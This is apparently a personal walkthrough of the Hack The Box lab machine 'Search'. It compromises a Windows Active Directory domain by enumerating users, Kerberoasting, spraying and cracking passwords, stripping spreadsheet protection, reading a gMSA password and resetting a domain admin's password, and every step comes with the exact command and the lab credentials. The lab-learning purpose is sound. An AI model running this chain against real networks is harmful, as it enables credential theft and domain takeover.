title: Search - Hack The Box
excerpt: "Search is a hard difficulty Windows machine that focuses on Active Directory enumeration and exploitation
techniques. Foothold is obtained by finding exposed credentials in a web page, enumerating AD users,
running a Kerberoast attack to obtain a crackable hash for a service account and spraying the password
against a subset of the discovered accounts, obtaining access to a SMB share where a protected XLSX file
containing user data is found. Unprotecting the file leads to a second set of credentials, which gives access
to another share where PKCS#12 certificates can be downloaded. After importing the certificates into a web
browser, Windows PowerShell Web Access can be used to obtain an interactive shell on the system. Due to
misconfigured ACLs, the user can retrieve the password of a group managed service account which can
change the password of an administrative user, resulting in high-privileged access to the system via
wmiexec or psexec."

## Synopsis
Search is a hard difficulty Windows machine that focuses on Active Directory enumeration and exploitation
techniques. Foothold is obtained by finding exposed credentials in a web page, enumerating AD users,
running a Kerberoast attack to obtain a crackable hash for a service account and spraying the password
against a subset of the discovered accounts, obtaining access to a SMB share where a protected XLSX file
containing user data is found. Unprotecting the file leads to a second set of credentials, which gives access
to another share where PKCS#12 certificates can be downloaded. After importing the certificates into a web
browser, Windows PowerShell Web Access can be used to obtain an interactive shell on the system. Due to
misconfigured ACLs, the user can retrieve the password of a group managed service account which can
change the password of an administrative user, resulting in high-privileged access to the system via
wmiexec or psexec.

## Reconnaissance
before going deep enumeration of Active Directory, im gonna collect `naming context` from ldap with following command :

```bash
ldapsearch -h $ip -x -s base namingcontexts
```

![](/assets/img/search/2.png)

let's added search.htb

### HTTP

accessing default page

![](/assets/img/search/22.png)

in our team section we found the username, might be usefull

![](/assets/img/search/3.png)

put on feroxbuster using raft medium from seclist will found /STAFF with status forbidden

```

already done with fuzzing the sub domain without any lucks, and fuzzing the target found /staff with common wordlist from seclist

```bash
ffuf -c -u http://search.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![](/assets/img/search/4.png)

when accessing `/staff` we will find a login portal, and we do not have credentials yet.

![](/assets/img/search/7.png)

## Web_svc

when enumerating on the website, I found instructions like the picture below

![](/assets/img/search/40.png)

```text
sendpassword to hope sharp
IsolationIsKey?
```

as soon i used bloodhound.py to gather information about target with this credentials

```bash
./bloodhound.py -d search.htb -u hope.sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -c all
```

start bloodhound and use `list all kerberoastable account` will get `web_svc` information

![](/assets/img/search/39.png)

to identify Service Principal Names (SPNs) we can use GetUserSPN.py from impacket with prompt:

```bash
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request -dc-ip 10.10.11.129 -outputfile hash
```

![](/assets/img/search/5.png)

we obtain hash from `web_svc` let's crack the hash using john the ripper

```bash
john hash -w=usr/share/wordlists/rockyou.txt
```

![](/assets/img/search/6.png)

 i just tried to grep certsrv again with this creds still failling. keep digging on smb, using `smbap` to see what permission this user has

![](/assets/img/search/8.png)

start from certenroll shares, but I think the cert key below is only for accessing https in general, keep enumeration.

![](/assets/img/search/9.png)

enumerate on `RedirectedFolder$` share will get bunch of usernames

![](/assets/img/search/10.png)

at this stage we cannot enter existing shares, because we do not have permission to do that. i just collect that names for further enumeration

use this command for grep name only

```
cat usernames | awk '{print $1}' >> users
```

![](/assets/img/search/11.png)

now we can perform usernames spraying with that list on smb service using `crackmapexec` with password `@3ONEmillionbaby`

![](/assets/img/search/12.png)

with the results I can not believe, with the result I can't believe, we can find a suitable credential

```bash
search.htb\edgar.jacobs:@3ONEmillionbaby
```

## Sierra Frye

re-login on smb service using edgar.jacobs credentials will found a excel file.

![](/assets/img/search/16.png)

let's download this file, and open it on google docs will only see a usernames

![](/assets/img/search/17.png)

at this time I did not find any clues, I finally decided to opened my windows box, this file actually protected by a password. and we dont have it, googling about remove protectection on excel file will lead me into this [article](https://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/).

![](/assets/img/search/encrypted.png)


here's my step:

* unzip the Phising file
* going to file sheet2.xml in /xl/worksheets directory
* you can open gedit or vim and remove this sheetProtection line

```xml
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/><sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```

* zip all files again with prompt:

```
zip -fr Phishing_Attempt.xlsx *
```

![](/assets/img/search/19.png)

at this time we can use excel online and it can be seen that we get a list of passwords

![](/assets/img/search/20.png)

and back again to bruteforce using `crackmapexec` 

```
crackmapexec smb $ip -u users -p passwords
```

![](/assets/img/search/23.png)

let's login into smb again as sierra

```
sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18
```

with this credentials we can found cert.key from `\Downloads\Backup\` folder

![](/assets/img/search/24.png)

download this cert and import on firefox

![](/assets/img/search/25.png)

but when i use `$$49=wide=STRAIGHT=jordan=28$$18` as a password, it couldnt match. we still had a pfx file right, i've get information on stackoverflow if we able to crack this file using john the ripper.

convert this pfx file into john format

```bash
pfx2john staff.pfx > hash
```

then using john to crack the hash with following command:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![](/assets/img/search/26.png)

as soon we successfully to import this cert

![](/assets/img/search/27.png)

and now back again into /staff will find powershell web access

![](/assets/img/search/28.png)

we can login as sierra and use password `$$49=wide=STRAIGHT=jordan=28$$18`, for computer name we can use `research` , which we know is our target host name from the certificate commonName shown in the nmap output.

![](/assets/img/search/29.png)

## Tristan Davies

Back to bloodhound again to see about sierra user and make it into starting as a node

![](/assets/img/search/30.png)

`sierra.frye` is a member of `brimingham-itsec` and this group is managed by the `ITSEC` group, and the ITSEC group itself has the ability to Read GMSA Password for covid.search.htb(BIR-ADFS-GMSA).
it means we can escalate to BIR-ADFS-GMSA user, then this user has GenericAll capability on user `TRISTAN.DAVIES`. `GenericAll` (full object control) means BIR-ADFS-GMSA user can reset password for user `TRISTAN.DAVIES`. 
Goal in this box is that we have to reach Tristan because of this user group member of domain admin

this good poc of gmsa password [retrevial](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password)

```powershell
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

![](/assets/img/search/31.png)

as you can see we can dump the password, GMSA password it's hard to decode. but we can make the password into variable.

```powershell
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

#make the password into variable
$c = ConvertFrom-ADManagedPasswordBlob $mp
```

switch user into `BIR-ADFS-GMSA` with following command:

```powershell
$username ="BIR-ADFS-GMSA";
$password = $c.SecureCurrentPassword; 
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $password;
```

use `whoami` command to check if we `BIR-ADFS-GMSA` user or not with prompt:

```powershell
Invoke-Command -ScriptBlock { whoami } -ComputerName RESEARCH -Credential $cred
```

![](/assets/img/search/33.png)

as you can see, now we bir-adfs user, from now we can change the domain admin password into `bunnys666` with following command:

```powershell
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies bunnys666 /domain}
```

![](/assets/img/search/34.png)

check on crackmapexec

![](/assets/img/search/35.png)

grab our root.txt using wmiexec.py

```bash
wmiexec.py search/tristan.davies:bunnys666@$ip
```

![](/assets/img/search/37.png)
